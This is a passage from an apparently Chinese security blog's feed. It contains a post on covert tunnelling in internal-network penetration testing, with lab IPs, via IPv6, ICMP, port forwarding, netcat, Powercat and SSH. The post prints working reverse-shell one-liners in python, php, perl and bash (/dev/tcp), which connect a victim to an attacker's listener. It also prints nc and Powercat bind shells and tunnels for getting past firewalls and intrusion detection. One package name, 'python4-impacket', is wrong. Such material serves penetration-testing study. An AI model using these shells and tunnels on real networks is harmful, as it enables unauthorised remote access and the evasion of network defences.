-l</code>，可以看到该用户可以执行root的所有命令，但是不是所有用户都可以，比如pmoore就不行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始打vulnhub&lt;/p&gt;
&lt;p&gt;download：&lt;code&gt;https://www.vulnhub.com/entry/lampsecurity-ctf4,83/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;扫描：&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="VulnHub" scheme="http://example.com/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透-隧道隐藏</title>
    <link href="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
    <id>http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</id>
    <published>2022-02-09T16:00:00.000Z</published>
    <updated>2022-02-10T07:11:43.716Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h1><p>当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否进出），该技术通常用于在访问受限的内网环境中完成内网之内、内网与公网之间安全、稳定的数据传输。</p><p>在最简单的情况下，两台主机之间数据的交换建立在TCP/IP协议之上，也就是说知道了IP、建立了TCP连接，那么两台主机便可以进行数据传输。</p><p>但在大多数情况下，内网的环境存在多种边界设备以及入侵检测装置的限制，它们会对主机间或者内网与外网之间通信的流量进行检测，如果存在异常就会进行拦截，这无疑给内网渗透增加了难度，而隐藏通信隧道技术就是为了绕过各种边界设备的封锁，从而完成主机间或内网与外网之间的通信。</p><h1 id="常见隧道"><a href="#常见隧道" class="headerlink" title="常见隧道"></a>常见隧道</h1><p>网络层：IPV6隧道、ICMP隧道</p><p>传输层：TCP隧道、UDP隧道、端口转发</p><p>应用层：SSH隧道、HTTP(S)隧道、DNS隧道</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="1-IPV6隧道"><a href="#1-IPV6隧道" class="headerlink" title="1.IPV6隧道"></a>1.IPV6隧道</h3><blockquote><p>  工具：6tunnel（kali自带）</p><p>  靶机：winserver2008</p><p>  攻击机：kali</p></blockquote><p>首先要开启靶机的IPV6</p><p><img src="/2022/02/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20220210134112319.png" alt="image-20220210134112319"></p><p>之后查看靶机的ipv6地址，假设为aaaa:bbbb:cccc:dddd</p><p>在kali：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">6tunnel -4 80 aaaa:bbbb:cccc:dddd%eth080</span><br><span class="line"><span class="comment">#将靶机的80端口（ipv6）转发到本地的80端口（ipv4）</span></span><br></pre></td></tr></table></figure><p>之后访问本地的80端口就可访问目标机的服务</p><h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><p>一般通信都需要端口的开启，ICMP则不需要开放任何端口。</p><p>渗透测试中，如果防火墙对各种上层协议(HTTP.HTTPS,DNS等)的数据包进行了封锁，那么我们可以尝试一下网管常常漏掉的ICMP协议包，我们可以将TCP数据包封装到ICMP数据包中，如果防火墙不对ICMP包进行拦截，那么我们便可以实现对防火墙的突破</p><h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><blockquote><p>  工具：icmpsh</p><p>  download：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><p>  需要python的impacket类库：apt-get install python4-impacket</p><p>  由于icmpsh要代替系统本身的ping应答，所以要关闭一下系统的ping应答，否则工具将无法稳定运行</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br></pre></td></tr></table></figure></blockquote><p>之后跑run.sh脚本即可，输入靶机与攻击机IP后会给出要在靶机上运行的指令</p><p>执行后即可回弹shell</p><h4 id="pingtunnel"><a href="#pingtunnel" class="headerlink" title="pingtunnel"></a>pingtunnel</h4><p>网络的拓扑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br></pre></td></tr></table></figure><p>可访问web服务，但不能访问数据库服务器；web服务器只能通过icmp访问数据库服务器。</p><blockquote><p>  工具：pingtunnel</p><p>  make &amp;make install</p></blockquote><p>在web服务器上也要装，之后<code>ptunnel -x aaa</code>(在web服务器上开启一个密码为aaa的icmp隧道)</p><p>在攻击机上：<code>ptunnel -p 192.168.1.5 -lp 1080 -da 192.168.1.2 -dp 3389 -x aaa</code></p><p>(当访问攻击机的1080端口时，数据库服务器3389端口的数据便会以web服务器为中转，通过刚刚搭建好的以aaa为密码的ICMP隧道传送到攻击机的1080端口上)</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><h4 id="1-端口转发"><a href="#1-端口转发" class="headerlink" title="1.端口转发"></a>1.端口转发</h4><blockquote><p>  工具：lcx</p><p>  download：<a href="https://github.com/yw9381/lcx">https://github.com/yw9381/lcx</a></p></blockquote><p>lcx的原理就是搭建Socket隧道，一个正常的Socket隧道必须具备两端：客户端、服务端，服务端开启监听端口，客户端传入服务端的IP与端口，主动与服务端连接</p><blockquote><p>  攻击机：192.168.1.2</p></blockquote><p>在靶机上：<code>lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389</code></p><p>(将本机的3389端口转发到攻击机的4444端口)</p><p>在攻击机上：<code>./portmap -m 2 -p1 4444 -h2 192.168.1.2 -p2 5555</code></p><p>（将本地的4444端口接收的数据转发到5555端口）</p><p>然后访问本机的5555端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali下可：rdesktop &quot;127.0.0.1:5555&quot;</span><br><span class="line">win下直接远程桌面链接：127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-netcat"><a href="#2-netcat" class="headerlink" title="2.netcat"></a>2.netcat</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -<span class="built_in">help</span></span><br><span class="line">-p 指定端口</span><br><span class="line">-v 显示细节</span><br><span class="line">-u 使用UDP传输协议</span><br><span class="line">-l 监听模式</span><br><span class="line">-w 设置超时时间</span><br></pre></td></tr></table></figure><h5 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h5><p><strong>正向shell</strong></p><p>正向连接使用频率较少，因为这种shell很容易被各种边界设备所拦截</p><p>靶机中：<code>nc -lvp 4444 -e /bin/sh</code>（把/bin/sh发送给请求本机4444端口的中断）</p><p>攻击机上：<code>nc 192.168.1.2 4444</code></p><p><strong>反向shell</strong></p><p>受害及主动来连接攻击机，这种方法在渗透测试中更为常用，因为它可以突破许多边界设备的封锁</p><p>攻击机上：<code>nc -lvp 5555</code></p><p>靶机上：    <code>nc 192.168.1.4 5555 -e /bin/sh</code></p><p>这是在靶机上已经装了nc攻击，若没装的话，可使用其他来反弹shell：</p><h6 id="1-用pyhton反弹shell"><a href="#1-用pyhton反弹shell" class="headerlink" title="1.用pyhton反弹shell"></a>1.用pyhton反弹shell</h6><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击机IP&quot;,攻击机监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="2-php反弹shell"><a href="#2-php反弹shell" class="headerlink" title="2.php反弹shell"></a>2.php反弹shell</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机监听的端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="3-perl反弹shell"><a href="#3-perl反弹shell" class="headerlink" title="3.perl反弹shell"></a>3.perl反弹shell</h6><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机监听端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h6 id="4-bash反弹shell"><a href="#4-bash反弹shell" class="headerlink" title="4.bash反弹shell"></a>4.bash反弹shell</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.4(攻击机ip)/6666 0&gt;&amp;1</span><br><span class="line">将受害机上的输入与输出以TCP流的形式重定向到攻击机的6666端口</span><br></pre></td></tr></table></figure><h4 id="3-Powercat"><a href="#3-Powercat" class="headerlink" title="3.Powercat"></a>3.Powercat</h4><blockquote><p>  download：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p></blockquote><p>工具下载后需要导入powercat.ps1脚本后才可以正常使用powercat</p><p>执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure><p>如果权限不够需要修改权限：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure><p>部分参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-c 指定一个ip地址</span><br><span class="line">-p 指定一个端口</span><br><span class="line">-v 显示详情</span><br><span class="line">-l 监听模式</span><br><span class="line">-e 程序重定向</span><br></pre></td></tr></table></figure><h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br><span class="line"><span class="comment">#这条命令的意思是把cmd.exe数据包发送给请求本机8888端口的主机</span></span><br></pre></td></tr></table></figure><p>攻击机：</p><p><code>nc 192.168.1.2 8888 -vv</code></p><h3 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h3><p>攻击机先监听本机5555端口<code>nc -lpvv 5555</code></p><p>靶机：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">1.4</span> <span class="literal">-p</span> <span class="number">5555</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><h3 id="1-ssh"><a href="#1-ssh" class="headerlink" title="1.ssh"></a>1.ssh</h3><p>常见参数：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台执行SSH</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发</span><br><span class="line">-P 指定SSH端口</span><br></pre></td></tr></table></figure><p>网络拓扑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击机：192.168.1.4</span><br><span class="line">web服务：192.168.1.5</span><br><span class="line">数据库服务器：192.168.1.2</span><br><span class="line"></span><br><span class="line">实验环境：攻击机无法访问数据库服务器，可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问</span><br><span class="line"></span><br><span class="line">实验目标：通过本地端口转发，访问攻击机本地的5555端口便可以打开数据库服务器的远程桌面</span><br></pre></td></tr></table></figure><h4 id="1-本地转发"><a href="#1-本地转发" class="headerlink" title="1.本地转发"></a>1.本地转发</h4><p>在攻击机上：</p><p><code>ssh -CfNg -L 5555:192.168.1.2:3389 root@192.168.1.5</code>(这条命令的意思就是攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机)</p><p>之后会输入web服务器的密码，由于是静默模式，可以本地查看5555端口是否被监听来检查通道的建立是否正常</p><p><code>netstat -tulnp | grep &quot;5555&quot;</code></p><p>接下来攻击机访问本机5555端口即可打开数据库的远程桌面：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="2-远程转发"><a href="#2-远程转发" class="headerlink" title="2.远程转发"></a>2.远程转发</h4><p>在web服务器上：</p><p><code>ssh -CfNg -R 5555:192.168.1.2:3389 root@192.168.1.4</code>（这条命令的意思是此时的web服务器虽然依旧是跳板，但是无论是连接数据库服务器的3389还是去连接攻击机的5555都是web服务器主动发起）</p><p>之后输入攻击机的密码，在攻击机访问本地的5555端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:5555</span><br></pre></td></tr></table></figure><h4 id="3-动态转发"><a href="#3-动态转发" class="headerlink" title="3.动态转发"></a>3.动态转发</h4><p>在攻击机上：</p><p><code>ssh -CfNg -D 6000 root@192.168.1.5</code>（搭建了一个动态的SOCKS代理通道）</p><p>之后输入web服务器的密码，查看是否链接成功<code>netstat -tulnp | grep &quot;:6000&quot;</code></p><p>然后在本地浏览器设置好socks代理就可访问数据服务器上开放的web服务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;隐藏通信隧道技术&quot;&gt;&lt;a href=&quot;#隐藏通信隧道技术&quot; class=&quot;headerlink&quot; title=&quot;隐藏通信隧道技术&quot;&gt;&lt;/a&gt;隐藏通信隧道技术&lt;/h1&gt;&lt;p&gt;当我们进入内网完成信息收集后，接下来就要判断内网的连通性（流量能否</summary>
      
    
    
    
    
    <category term="内网" scheme="http://example.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
